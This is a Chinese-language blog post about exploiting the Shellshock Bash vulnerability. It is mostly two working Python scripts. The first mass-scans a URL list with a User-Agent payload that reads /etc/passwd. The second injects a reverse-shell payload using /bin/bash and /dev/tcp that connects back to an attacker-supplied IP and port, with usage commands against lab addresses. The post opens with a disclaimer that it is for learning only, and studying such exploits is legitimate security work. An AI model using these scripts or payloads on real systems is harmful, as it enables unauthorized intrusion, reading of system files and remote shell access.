@@ -1,0 +1,178 @@
+本文中使用的脚本仅限于学习交流，请勿非法使用，造成的一切后果，均由使用者承担，特此声明。
+
+最近在做护网前的内网测试准备，在测试过程中发现内网中存在大量的Bash远程解析命令执行漏洞，说实话这个漏洞有点陈旧了，但是对于渗透测试人员来说，这个漏洞是可以直接获取到目标服务的sehll,闲暇时间进行对此漏洞进行了再一次的复现，并编写了一个比较low的检测脚本和反弹shell的脚本。
+
+至于漏洞原理，小白在这里就不啰嗦了，直接上复现的过程以及批量扫描的截图（说实话，脚本只是对一个目标IP进行了批量扫描，脚本在内网还挺实用的，不用手动去探测了，一个脚本命令就可以搞定。）
+
+![](https://image.3001.net/images/20200816/1597566455.png!small)
+
+批量扫描目标主机是否存在Bash远程解析命令执行漏洞：
+
+>
+>  
+>     > #date 20200816  
+>     > #Author cmdback  
+>     >  
+>     > import requests  
+>     > import sys  
+>     > import threading  
+>     > import optparse  
+>     >  
+>     >  
+>     > #bash远程代码执行漏洞检测脚本  
+>     >  
+>     >  
+>     > class BashCode(threading.Thread):  
+>     >  
+>     > def __init__(self):  
+>     > super(BashCode, self).__init__()  
+>     >  
+>     > #检测目标IP是否存在bash远程代码执行漏洞  
+>     > def run(self):  
+>     > try:  
+>     > with open(urlfile,'r') as f:  
+>     > urls = f.readlines()  
+>     > for url in urls:  
+>     > url = url.strip()  
+>     > headers = {  
+>     > #payload测试是否会返回/etc/passwd文件的内容  
+>     > 'User-Agent': '() { :;};echo;/bin/cat /etc/passwd',  
+>     > 'Accept':
+> 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',  
+>     > 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-> US;q=0.3,en;q=0.2',  
+>     > 'Connection': 'close',  
+>     > 'Cookie': '__lnk_uid=b296ad65-ce7b-4a55-81c2-6dcd35e065ba;
+> JSESSIONID=20Lzf4MGWBVyVcnLXVFb2pnWJlXLvxSX1mFx9Q2G4kmyqf2p25rJ!-1813742044',  
+>     > 'Upgrade-Insecure-Requests': '1',  
+>     > 'Cache-Control': 'max-age=0'  
+>     > }  
+>     > res = requests.get(url=url,headers=headers)  
+>     > code = 'root' in res.text  
+>     > if res.elapsed.total_seconds() < 10 and code == True:  
+>     > print("\033[31m{}存在bash远程代码执行漏洞\033[0m".format(url))  
+>     > with open(ResFile,'a+',encoding='utf-8') as f:  
+>     > f.writelines(url+ "-->>>" + "存在bash远程代码执行漏洞" + '\n')  
+>     > else:  
+>     > print("{}不存在bash远程代码执行漏洞".format(url))  
+>     > except OSError as e:  
+>     > print(e)  
+>     >  
+>     > if __name__ == '__main__':  
+>     > try:  
+>     > # 设置参数  
+>     > usage = "python -u urlfile  -o ResFile"  
+>     >  
+>     > parse = optparse.OptionParser(usage)  
+>     > parse.add_option('-u', '--urlfile', dest="urlfile", help="Enter a
+> urlfile")  
+>     > parse.add_option('-o', '--ResFile', dest="ResFile", help="Enter a
+> ResFile")  
+>     > (options, arges) = parse.parse_args()  
+>     > if options.urlfile == None or options.ResFile == None:  
+>     > print(parse.usage)  
+>     > sys.exit(0)  
+>     > else:  
+>     > urlfile = options.urlfile  
+>     > ResFile = options.ResFile  
+>     > # 多线程进行检测目标地址是否存在bash远程代码执行漏洞  
+>     > threads = []  
+>     > thread_count = int(30)  
+>     > for i in range(thread_count):  
+>     > t1 = BashCode()  
+>     > threads.append(t1)  
+>     > for t in threads:  
+>     > if not t1.isAlive():  
+>     > t1.start()  
+>     > else:  
+>     > pass  
+>     > for t in threads:  
+>     > t1.join()  
+>     > except Exception as e:  
+>     > print(e)
+
+批量检测截图：
+
+python3.exe bash.py -u url.txt -o 0816.txt
+
+url.txt -->>>待检测的url地址，自定义。
+
+0816.txt-->>>存在漏洞的url保存文件，自定义。
+
+![](https://image.3001.net/images/20200816/1597570083.png!small)
+
+用bp测试读取/etc/passwd文件：
+
+![](https://image.3001.net/images/20200816/1597570406.png!small)
+
+反弹shell代码:
+
+    
+    
+    import requests  
+    import sys  
+    import optparse  
+      
+      
+    #bash远程代码执行漏洞反弹shell  
+    #需要在服务器上面进行监听某个自定义的端口  
+      
+    def BashGetShellip():  
+    try:  
+    #这个地方捣鼓了半个小时，原来是格式化的问题  
+    GetShellCode = "() { :;};echo;/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (attackip,attackport)  
+    #http://www.jackson-t.ca/runtime-exec-payloads.html 可以将反弹一句话进行base64编码  
+    headers = {  
+    #进行反弹shell的脚本  
+    'User-Agent': GetShellCode,  
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',  
+    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',  
+    'Connection': 'close',  
+    'Cookie': '__lnk_uid=b296ad65-ce7b-4a55-81c2-6dcd35e065ba; JSESSIONID=20Lzf4MGWBVyVcnLXVFb2pnWJlXLvxSX1mFx9Q2G4kmyqf2p25rJ!-1813742044',  
+    'Upgrade-Insecure-Requests': '1',  
+    'Cache-Control': 'max-age=0'  
+    }  
+    res = requests.get(url,headers=headers)  
+    if res.status_code == 200:  
+    print("成功反弹shell")  
+    else:  
+    print("反弹shell失败")  
+    except Exception as e:  
+    print(e)  
+    finally:  
+    print("反弹shell失败")  
+      
+    if __name__ == '__main__':  
+    try:  
+    # 设置参数  
+    usage = "python -u url  -i attackip -p attackport"  
+      
+    parse = optparse.OptionParser(usage)  
+    parse.add_option('-u', '--ur', dest="url", help="Enter a url")  
+    parse.add_option('-i', '--attackip', dest="attackip", help="Enter a attackip")  
+    parse.add_option('-p', '--attackport', dest="attackport", help="Enter a attackport")  
+    (options, arges) = parse.parse_args()  
+    if options.url == None or options.attackip == None or options.attackport == None:  
+    print(parse.usage)  
+    sys.exit(0)  
+    else:  
+    url = options.url  
+    attackip = options.attackip  
+    attackport = options.attackport  
+    except Exception as e:  
+    print(e)  
+    #调用函数  
+    BashGetShellip()
+
+我们在运行脚本前，在另外一个服务器上面进行监听自定义的端口，这样就可以反弹shell。
+
+python3.exe bashshell.py -u http://192.168.19.139:8080/victim.cgi -i
+192.168.19.131 -p 12345
+
+-u -->>>指的是存在bash远程代码执行漏洞的地址；
+
+-i -->>>指的是接收shell的地址；
+
+-p -->>>指的是需要指定监听的端口，自定义；
+
+![](https://image.3001.net/images/20200816/1597570970.png!small)
+
